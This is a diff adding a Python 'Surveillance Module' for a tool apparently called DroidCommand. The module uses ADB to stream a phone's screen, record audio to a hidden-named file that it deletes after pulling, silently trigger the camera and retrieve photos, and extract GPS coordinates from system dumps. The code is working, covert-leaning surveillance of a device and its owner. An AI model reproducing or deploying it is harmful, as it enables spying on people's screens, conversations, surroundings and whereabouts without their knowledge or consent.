@@ -1,0 +1,256 @@
+"""
+DroidCommand — Surveillance Module
+Modules 1-4: Screen Mirroring, Mic Capture, Camera Capture, GPS Location
+"""
+
+import subprocess
+import time
+import re
+import os
+import base64
+from pathlib import Path
+from config import ADB_PATH, TEMP_DIR
+from adb_engine import ADBEngine
+
+adb = ADBEngine()
+
+
+# ==================== MODULE 1: LIVE SCREEN MIRRORING ====================
+
+def capture_screen_frame():
+    """Capture a single screen frame as PNG bytes."""
+    try:
+        res = subprocess.run(
+            [adb.adb_path, "exec-out", "screencap", "-p"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            timeout=8
+        )
+        if res.returncode == 0 and len(res.stdout) > 100:
+            return {"success": True, "frame": res.stdout, "size": len(res.stdout)}
+        return {"success": False, "error": "Capture écran vide ou échouée"}
+    except subprocess.TimeoutExpired:
+        return {"success": False, "error": "Timeout capture écran"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def capture_screen_jpeg(quality=60):
+    """Capture screen and return as JPEG base64 for web streaming."""
+    try:
+        # Capture as PNG first
+        res = subprocess.run(
+            [adb.adb_path, "exec-out", "screencap", "-p"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            timeout=8
+        )
+        if res.returncode != 0 or len(res.stdout) < 100:
+            return {"success": False, "error": "Capture échouée"}
+
+        # Return raw PNG bytes (browser can handle PNG directly)
+        img_b64 = base64.b64encode(res.stdout).decode("ascii")
+        return {"success": True, "image_b64": img_b64, "format": "png"}
+
+    except subprocess.TimeoutExpired:
+        return {"success": False, "error": "Timeout"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+# ==================== MODULE 2: MIC / AUDIO CAPTURE ====================
+
+def record_audio(duration=10):
+    """Record audio from the device (uses screenrecord which captures internal audio)."""
+    try:
+        duration = min(max(int(duration), 3), 60)  # Clamp 3-60s
+        remote_path = "/sdcard/.dc_audio_cap.mp4"
+        local_path = str(TEMP_DIR / f"audio_capture_{int(time.time())}.mp4")
+
+        # screenrecord captures screen + audio (internal audio on Android 10+)
+        rec_res = adb.shell(
+            f"screenrecord --time-limit {duration} --size 320x240 --bit-rate 500000 {remote_path}",
+            timeout=duration + 10
+        )
+
+        # Pull the recorded file
+        pull_res = adb.run_cmd(["pull", remote_path, local_path], timeout=15)
+
+        # Cleanup remote
+        adb.shell(f"rm -f {remote_path}")
+
+        if pull_res["success"] and os.path.exists(local_path):
+            file_size = os.path.getsize(local_path)
+            if file_size > 100:
+                return {
+                    "success": True,
+                    "filepath": local_path,
+                    "duration": duration,
+                    "size": file_size,
+                    "filename": os.path.basename(local_path)
+                }
+
+        return {"success": False, "error": "Fichier audio vide ou pull échoué"}
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+# ==================== MODULE 3: CAMERA CAPTURE ====================
+
+def capture_camera(camera_id=0):
+    """
+    Take a photo using the device camera.
+    camera_id: 0 = back camera, 1 = front camera
+    """
+    try:
+        camera_id = int(camera_id)
+        timestamp = int(time.time())
+
+        # Method: Open camera app, switch if needed, take photo
+        # Step 1: Open camera
+        adb.shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
+        time.sleep(3)
+
+        # Step 2: If front camera requested, send switch event
+        if camera_id == 1:
+            # Samsung camera switch button or generic toggle
+            adb.shell("input keyevent 1000054")  # KEYCODE_CAMERA_SWITCH (some devices)
+            time.sleep(1)
+            # Fallback: tap typical front camera switch location
+            adb.shell("input tap 120 120")
+            time.sleep(1)
+
+        # Step 3: Take photo via shutter keyevent
+        adb.shell("input keyevent 27")  # KEYCODE_CAMERA
+        time.sleep(3)
+
+        # Step 4: Find most recent photo
+        ls_res = adb.shell("ls -t /sdcard/DCIM/Camera/ 2>/dev/null | head -3")
+        if ls_res["success"] and ls_res["stdout"]:
+            files = [f.strip() for f in ls_res["stdout"].splitlines() if f.strip()]
+            if files:
+                newest = files[0]
+                remote_path = f"/sdcard/DCIM/Camera/{newest}"
+                local_path = str(TEMP_DIR / f"camera_{camera_id}_{timestamp}_{newest}")
+
+                pull_res = adb.run_cmd(["pull", remote_path, local_path], timeout=15)
+                # Close camera app
+                adb.shell("input keyevent 4")  # BACK
+                time.sleep(0.5)
+                adb.shell("input keyevent 4")  # BACK again
+
+                if pull_res["success"] and os.path.exists(local_path):
+                    return {
+                        "success": True,
+                        "filepath": local_path,
+                        "filename": os.path.basename(local_path),
+                        "camera": "front" if camera_id == 1 else "back",
+                        "size": os.path.getsize(local_path)
+                    }
+
+        # Fallback: take a screenshot instead
+        adb.shell("input keyevent 4")
+        frame = capture_screen_frame()
+        if frame["success"]:
+            fallback_path = str(TEMP_DIR / f"camera_fallback_{timestamp}.png")
+            with open(fallback_path, "wb") as f:
+                f.write(frame["frame"])
+            return {
+                "success": True,
+                "filepath": fallback_path,
+                "filename": os.path.basename(fallback_path),
+                "camera": "screenshot_fallback",
+                "size": os.path.getsize(fallback_path)
+            }
+
+        return {"success": False, "error": "Impossible de capturer une photo"}
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+# ==================== MODULE 4: GPS LOCATION ====================
+
+def get_gps_location():
+    """Get the device's GPS/network location."""
+    try:
+        result = {
+            "success": False,
+            "lat": None,
+            "lon": None,
+            "accuracy": None,
+            "provider": None,
+            "altitude": None,
+            "raw": ""
+        }
+
+        # Check if location is enabled
+        loc_enabled = adb.shell("settings get secure location_providers_allowed")
+        result["location_enabled"] = loc_enabled.get("stdout", "").strip()
+
+        # Method 1: dumpsys location — look for last known location
+        dump = adb.shell("dumpsys location", timeout=10)
+        raw_output = dump.get("stdout", "")
+        result["raw"] = raw_output[:2000]  # Cap raw output
+
+        # Parse location patterns
+        # Pattern: "last location=Location[gps 48.856614,2.352222 hAcc=10.0 ..."
+        # Or: "fused: Location[fused 48.856614,2.352222 ..."
+        patterns = [
+            r'last\s+location\s*=\s*Location\[(\w+)\s+([-\d.]+),([-\d.]+)\s+(?:hAcc|acc)=([\d.]+)',
+            r'Location\[(\w+)\s+([-\d.]+),([-\d.]+)\s+(?:hAcc|acc)=([\d.]+)',
+            r'(\w+):\s*Location\[.*?([-\d.]+),([-\d.]+).*?(?:hAcc|acc)=([\d.]+)',
+        ]
+
+        for pattern in patterns:
+            matches = re.findall(pattern, raw_output)
+            if matches:
+                # Take the first valid match
+                for match in matches:
+                    provider, lat, lon, acc = match[0], match[1], match[2], match[3]
+                    try:
+                        lat_f = float(lat)
+                        lon_f = float(lon)
+                        # Validate reasonable coordinates
+                        if -90 <= lat_f <= 90 and -180 <= lon_f <= 180:
+                            result["success"] = True
+                            result["lat"] = lat_f
+                            result["lon"] = lon_f
+                            result["accuracy"] = float(acc)
+                            result["provider"] = provider
+                            break
+                    except (ValueError, IndexError):
+                        continue
+                if result["success"]:
+                    break
+
+        # Method 2 fallback: try dumpsys activity for location-related services
+        if not result["success"]:
+            gms_dump = adb.shell(
+                'dumpsys activity service com.google.android.gms/.location.reporting.service.LocationReportingService 2>/dev/null | head -50',
+                timeout=8
+            )
+            gms_out = gms_dump.get("stdout", "")
+            coord_match = re.search(r'([-\d.]+),([-\d.]+)', gms_out)
+            if coord_match:
+                try:
+                    lat_f = float(coord_match.group(1))
+                    lon_f = float(coord_match.group(2))
+                    if -90 <= lat_f <= 90 and -180 <= lon_f <= 180:
+                        result["success"] = True
+                        result["lat"] = lat_f
+                        result["lon"] = lon_f
+                        result["provider"] = "gms"
+                except ValueError:
+                    pass
+
+        # Method 3: try getting last known via settings
+        if not result["success"]:
+            geo_res = adb.shell("settings get secure location_providers_allowed")
+            result["providers_status"] = geo_res.get("stdout", "").strip()
+
+        return result
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
